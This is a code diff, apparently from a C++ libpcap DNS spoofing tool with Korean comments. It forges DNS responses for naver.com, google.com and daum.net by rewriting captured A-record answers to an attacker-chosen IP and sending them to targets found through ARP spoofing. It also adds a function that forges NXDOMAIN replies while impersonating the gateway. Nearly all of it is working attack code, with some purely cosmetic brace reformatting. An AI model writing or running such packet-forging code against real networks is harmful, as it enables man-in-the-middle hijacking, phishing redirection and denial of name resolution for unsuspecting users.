@@ -45,19 +45,31 @@ bool load_dns_response_template(const char* filename, vector<vector<uint8_t>>& t
     int res;
     while ((res = pcap_next_ex(pcap_handle, &header, &packet)) >= 0) 
     {
-        if (res == 0 || header->caplen < 14) continue;
+        if (res == 0 || header->caplen < 14) 
+        {
+            continue;
+        }
 
         const ether_header* eth_hdr = reinterpret_cast<const ether_header*>(packet);
-        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) continue;
+        if (ntohs(eth_hdr->ether_type) != ETHERTYPE_IP) 
+        {
+            continue;
+        }
 
         const ip_header* ip_hdr = reinterpret_cast<const ip_header*>(packet + 14);
         int ip_header_len = (ip_hdr->ip_vhl & 0x0f) * 4;
-        if (ip_hdr->ip_p != IPPROTO_UDP) continue;
+        if (ip_hdr->ip_p != IPPROTO_UDP) 
+        {
+            continue;
+        }
 
         const udp_header* udp_hdr = reinterpret_cast<const udp_header*>(packet + 14 + ip_header_len);
         
         // 응답 패킷만 선택 (출발지 포트가 53인 경우)
-        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) continue;
+        if (ntohs(udp_hdr->uh_sport) != DNS_PORT) 
+        {
+            continue;
+        }
 
         templates.emplace_back(packet, packet + header->caplen);
     }
@@ -76,7 +88,7 @@ bool load_dns_response_template(const char* filename, vector<vector<uint8_t>>& t
 }
 
 // 패킷 캐싱을 위한 함수
-void cache_template_packet(const vector<uint8_t>& packet, const string& domain) 
+void cache_template_packet(const vector<uint8_t>& packet, const string& domain)
 {
     const int eth_len = 14;
     const auto* ip = (ip_header*)(packet.data() + eth_len);
@@ -84,72 +96,77 @@ void cache_template_packet(const vector<uint8_t>& packet, const string& domain)
     const auto* udp = (udp_header*)(packet.data() + eth_len + ip_header_len);
     const auto* dns = (dns_header*)(packet.data() + eth_len + ip_header_len + sizeof(udp_header));
 
-    // UDP 포트 확인 - 응답 패킷인지 확인 (출발지가 53인 경우)
     bool is_response = ntohs(udp->uh_sport) == DNS_PORT;
-    
-    if (!is_response) {
+
+    if (!is_response)
+    {
         cout << "경고: 응답 패킷이 아닌 패킷을 캐시에 저장하지 않음" << endl;
         return;
     }
 
-    // 쿼리 타입 확인
     uint8_t* qptr = (uint8_t*)dns + sizeof(dns_header);
-    while (*qptr != 0 && (qptr - (uint8_t*)dns) < packet.size() - (eth_len + ip_header_len + sizeof(udp_header))) {
+    while (*qptr != 0 && (qptr - (uint8_t*)dns) < packet.size() - (eth_len + ip_header_len + sizeof(udp_header)))
+    {
         qptr += (*qptr) + 1;
     }
-    qptr++;  // null byte 건너뛰기
+    qptr++;
     uint16_t qtype = ntohs(*(uint16_t*)qptr);
-    
-    // 캐시에 저장
+
     DnsTemplateCache cache_entry;
     cache_entry.packet = packet;
     cache_entry.qtype = qtype;
     cache_entry.is_response = is_response;
-    
+
     template_cache[domain].push_back(move(cache_entry));
-    
-    // 디버깅용
+
     cout << "캐시 추가: " << domain << ", 타입: " << qtype << ", 응답여부: " << (is_response ? "응답" : "요청") << endl;
 }
 
-// 최적화된 초기화 함수
-bool initialize_dns_templates() 
+// 초기화 함수 ( 템플릿 로딩)
+bool initialize_dns_templates()
 {
     bool success = true;
-    
-    if (!load_dns_response_template("data/dns_naver2.pcapng", dns_template_naver)) success = false;
-    if (!load_dns_response_template("data/dns_google2.pcapng", dns_template_google)) success = false;
-    if (!load_dns_response_template("data/dns_daum2.pcapng", dns_template_daum)) success = false;
-    
-    // 캐시 초기화 - 패킷 분석 및 저장
-    for (const auto& packet : dns_template_naver) {
+
+    if (!load_dns_response_template("data/dns_naver2.pcapng", dns_template_naver))
+        success = false;
+    if (!load_dns_response_template("data/dns_google2.pcapng", dns_template_google))
+        success = false;
+    if (!load_dns_response_template("data/dns_daum2.pcapng", dns_template_daum))
+        success = false;
+
+    for (const auto& packet : dns_template_naver)
+    {
         cache_template_packet(packet, "www.naver.com");
     }
-    
-    for (const auto& packet : dns_template_google) {
+
+    for (const auto& packet : dns_template_google)
+    {
         cache_template_packet(packet, "www.google.com");
     }
-    
-    for (const auto& packet : dns_template_daum) {
+
+    for (const auto& packet : dns_template_daum)
+    {
         cache_template_packet(packet, "www.daum.net");
     }
-    
+
     cout << "DNS 템플릿 캐시 초기화 완료: " << template_cache.size() << "개 도메인" << endl;
-    
+
     return success;
 }
 
-string extract_domain_name(const uint8_t* dns_data, size_t dns_len) 
+string extract_domain_name(const uint8_t* dns_data, size_t dns_len)
 {
     string domain;
     size_t pos = 12;
-    while (pos < dns_len) 
+    while (pos < dns_len)
     {
         uint8_t len = dns_data[pos];
-        if (len == 0) break;
-        if (!domain.empty()) domain.push_back('.');
+        if (len == 0)
+            break;
+        if (!domain.empty())
+            domain.push_back('.');
         pos++;
-        for (int i = 0; i < len && pos < dns_len; i++, pos++) 
+        for (int i = 0; i < len && pos < dns_len; i++, pos++)
         {
             domain.push_back(dns_data[pos]);
         }
@@ -175,7 +192,8 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     
     // 쿼리 타입 확인
     uint8_t* qptr = (uint8_t*)query_data + sizeof(dns_header);
-    while (*qptr != 0 && (qptr - query_data) < query_len) {
+    while (*qptr != 0 && (qptr - query_data) < query_len) 
+    {
         qptr += (*qptr) + 1;
     }
     qptr++;  // null 바이트 건너뛰기
@@ -186,10 +204,14 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
 
     // 도메인 검색
     string normalized_domain = domain;
-    for (auto& c : normalized_domain) c = tolower(c);
+    for (auto& c : normalized_domain) 
+    {
+        c = tolower(c);
+    }
     
     // 캐시에서 찾기
-    if (template_cache.find(normalized_domain) == template_cache.end()) {
+    if (template_cache.find(normalized_domain) == template_cache.end()) 
+    {
         cerr << "[" << domain << "] DNS 템플릿 없음. 전송 생략.\n";
         return;
     }
@@ -204,23 +226,28 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     
     // 타겟 MAC 주소 찾기
     bool found_target = false;
-    for (const auto& target : targets) {
-        if (ip_equals(requester_ip, target->get_ip())) {
+    for (const auto& target : targets) 
+    {
+        if (ip_equals(requester_ip, target->get_ip())) 
+        {
             memcpy(requester_mac, target->get_mac(), 6);
             found_target = true;
             break;
         }
     }
     
-    if (!found_target) {
+    if (!found_target) 
+    {
         cerr << "[DNS 응답] 대상 MAC 찾기 실패. 전송 생략.\n";
         return;
     }
     
     // 응답 패킷 생성
-    for (const auto& cache_entry : templates) {
+    for (const auto& cache_entry : templates) 
+    {
         // 응답 패킷인지 확인
-        if (!cache_entry.is_response) {
+        if (!cache_entry.is_response) 
+        {
             continue;
         }
         
@@ -239,7 +266,8 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
             ether_header* eth_resp = (ether_header*)packet_buffer.data();
             ip_header* ip_resp = (ip_header*)(packet_buffer.data() + eth_len);
             
-            if (ntohs(eth_resp->ether_type) != ETHERTYPE_IP) {
+            if (ntohs(eth_resp->ether_type) != ETHERTYPE_IP) 
+            {
                 cerr << "템플릿 패킷이 IP 패킷이 아님. 스푸핑 중단.\n";
                 continue;
             }
@@ -292,9 +320,16 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
             for (int i = 0; i < ntohs(dns_resp->ancount); i++) 
             {
                 // 도메인 이름 건너뛰기 (압축된 포인터 또는 일반 문자열)
-                if (current[0] == 0xC0) current += 2;
-                else {
-                    while (*current != 0 && (current - dns_data) < dns_len) current += 1 + *current;
+                if (current[0] == 0xC0) 
+                {
+                    current += 2;
+                }
+                else 
+                {
+                    while (*current != 0 && (current - dns_data) < dns_len) 
+                    {
+                        current += 1 + *current;
+                    }
                     current += 1;
                 }
 
@@ -304,7 +339,8 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
                 size_t offset = (current - dns_data) + 10;
 
                 // A 레코드인 경우에만 IP 주소 변경
-                if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len) {
+                if (answer_type == 1 && rdlength == 4 && offset + 4 <= dns_len) 
+                {
                     memcpy(dns_data + offset, &new_ip, 4);
                 }
 
@@ -318,22 +354,24 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
             struct timespec start, end;
             clock_gettime(CLOCK_MONOTONIC, &start);
             
-            for (int repeat = 0; repeat < REPEAT_COUNT; repeat++) {
-                // 패킷 전송
-                if (pcap_sendpacket(handle, packet_buffer.data(), spoof_packet_size) != 0) {
-                    cerr << "DNS 스푸핑 응답 전송 실패 #" << (repeat+1) << ": " << pcap_geterr(handle) << "\n";
-                } else {
-                    at_least_one_success = true;
-                    cout << "DNS 스푸핑 응답 전송 완료 #" << (repeat+1) << " (" 
-                         << domain << ", 타입: " << cache_entry.qtype 
-                         << ", 원본 트랜잭션 ID: 0x" << std::hex << ntohs(dns->id) << std::dec << ")\n";
+
+            // 패킷 전송
+            if (pcap_sendpacket(handle, packet_buffer.data(), spoof_packet_size) != 0) 
+            {
+                cerr << "DNS 스푸핑 응답 전송 실패 #" << ": " << pcap_geterr(handle) << "\n";
+            } 
+            else 
+            {
+                at_least_one_success = true;
+                cout << "DNS 스푸핑 응답 전송 완료 " << " (" << domain << ", 타입: " << cache_entry.qtype 
+                        << ")\n";
                 }
                 
-                // 마지막 패킷이 아니면 약간의 지연 (바로 연속으로 보내면 네트워크 장비가 중복으로 인식할 수 있음)
-                if (repeat < REPEAT_COUNT - 1) {
-                    usleep(1000);  // 1ms 지연
-                }
-            }
+                
+
+                usleep(1000);  // 1ms 지연
+
+
             
             clock_gettime(CLOCK_MONOTONIC, &end);
             long nsec = (end.tv_sec - start.tv_sec) * 1000000000L + (end.tv_nsec - start.tv_nsec);
@@ -350,4 +388,120 @@ void send_dns_spoof_response(pcap_t* handle, u_int8_t* orig_packet, size_t orig_
     if (!template_found) {
         cout << "[" << domain << "] 요청된 레코드 타입(" << qtype << ")에 맞는 템플릿을 찾지 못했습니다.\n";
     }
+}
+
+// DNS 스푸핑 복구 함수 - NXDOMAIN 패킷 사용
+void send_dns_recovery_responses(pcap_t* handle, 
+    const u_int8_t* attacker_mac, const u_int8_t* gateway_ip,
+    const std::vector<std::unique_ptr<SpoofTarget>>& targets) 
+{
+    cout << "DNS 스푸핑 복구 시작 (NXDOMAIN 패킷 + 정상 IP 패킷)..." << endl;
+    
+    // 복구할 도메인 목록
+    const vector<string> recovery_domains = {
+        "www.naver.com", 
+        "www.google.com", 
+        "www.daum.net"
+    };
+    
+    // 각 도메인에 대해 복구 패킷 전송
+    for (const auto& domain : recovery_domains) {
+        // 해당 도메인의 템플릿이 없으면 건너뛰기
+        string normalized_domain = domain;
+        for (auto& c : normalized_domain) c = tolower(c);
+        
+        if (template_cache.find(normalized_domain) == template_cache.end()) {
+            cerr << "[" << domain << "] DNS 템플릿 없음. 복구 생략.\n";
+            continue;
+        }
+        
+        // 해당 도메인의 A 레코드 템플릿을 찾기
+        bool found_template = false;
+        
+        for (const auto& cache_entry : template_cache[normalized_domain]) {
+            // A 레코드(타입 1)만 사용
+            if (cache_entry.qtype == 1 && cache_entry.is_response) {
+                found_template = true;
+                
+                // 각 대상별로 복구 패킷 전송
+                for (const auto& target : targets) 
+                {
+                    // NXDOMAIN 패킷 전송
+                    vector<uint8_t> nxdomain_packet = cache_entry.packet;
+                    const int eth_len = 14;
+                    
+                    // 이더넷 헤더 수정
+                    ether_header* eth_nx = (ether_header*)nxdomain_packet.data();
+                    memcpy(eth_nx->ether_shost, attacker_mac, 6);
+                    memcpy(eth_nx->ether_dhost, target->get_mac(), 6);
+                    
+                    // IP 헤더 수정
+                    ip_header* ip_nx = (ip_header*)(nxdomain_packet.data() + eth_len);
+                    int ip_header_len = (ip_nx->ip_vhl & 0x0f) * 4;
+                    
+                    // 출발지/목적지 IP 설정
+                    memcpy(&ip_nx->ip_src, gateway_ip, 4);
+                    memcpy(&ip_nx->ip_dst, target->get_ip(), 4);
+                    
+                    // 랜덤 ID 설정
+                    ip_nx->ip_id = htons(rand() % 65536);
+                    ip_nx->ip_sum = 0;
+                    
+                    // 체크섬 재계산
+                    uint16_t* ip_words = (uint16_t*)ip_nx;
+                    unsigned long ip_sum = 0;
+                    for (int i = 0; i < ip_header_len / 2; i++) 
+                    {
+                        ip_sum += ntohs(ip_words[i]);
+                    }
+                    while (ip_sum >> 16) 
+                    {
+                        ip_sum = (ip_sum & 0xFFFF) + (ip_sum >> 16);
+                    }
+                    ip_nx->ip_sum = htons(~ip_sum);
+                    
+                    // UDP 헤더 정보는 크게 수정할 필요 없음
+                    udp_header* udp_nx = (udp_header*)(nxdomain_packet.data() + eth_len + ip_header_len);
+                    
+                    // DNS 헤더 수정
+                    dns_header* dns_nx = (dns_header*)(nxdomain_packet.data() + eth_len + ip_header_len + sizeof(udp_header));
+                    dns_nx->id = htons(rand() % 65535);  // 랜덤 트랜잭션 ID
+                    
+                    // 중요: NXDOMAIN 설정 (RCODE=3)
+                    // DNS 플래그의 하위 4비트를 NXDOMAIN(3)으로 설정
+                    uint16_t flags = ntohs(dns_nx->flags);
+                    flags = (flags & 0xFFF0) | 0x0003;  // 하위 4비트를 RCODE 3으로 설정
+                    dns_nx->flags = htons(flags);
+                    
+                    // Answer 섹션 제거 (NXDOMAIN에는 답변이 없음)
+                    dns_nx->ancount = 0;
+                    
+                    // NXDOMAIN 패킷 전송
+                    for (int i = 0; i < 3; i++) 
+                    {
+                        if (pcap_sendpacket(handle, nxdomain_packet.data(), nxdomain_packet.size()) != 0) 
+                        {
+                            cerr << "NXDOMAIN 패킷 전송 실패: " << pcap_geterr(handle) << endl;
+                        } 
+                        else 
+                        {
+                            cout << "NXDOMAIN 패킷 전송 성공 [" << (i+1) << "/3]: " << domain 
+                                 << " (대상: " << target->get_ip_str() << ")" << endl;
+                        }
+                        usleep(10000);  // 10ms 지연
+                    }
+                    
+                    // 잠시 대기 - NXDOMAIN이 처리될 시간 부여
+                    usleep(50000);  // 50ms
+                }
+                break;
+            }
+        }
+        
+        if (!found_template) {
+            cerr << "[" << domain << "] A 레코드 템플릿을 찾지 못했습니다. 복구 생략.\n";
+        }
+    }
+    
+    cout << "DNS 스푸핑 복구 패킷 전송 완료" << endl;
 }
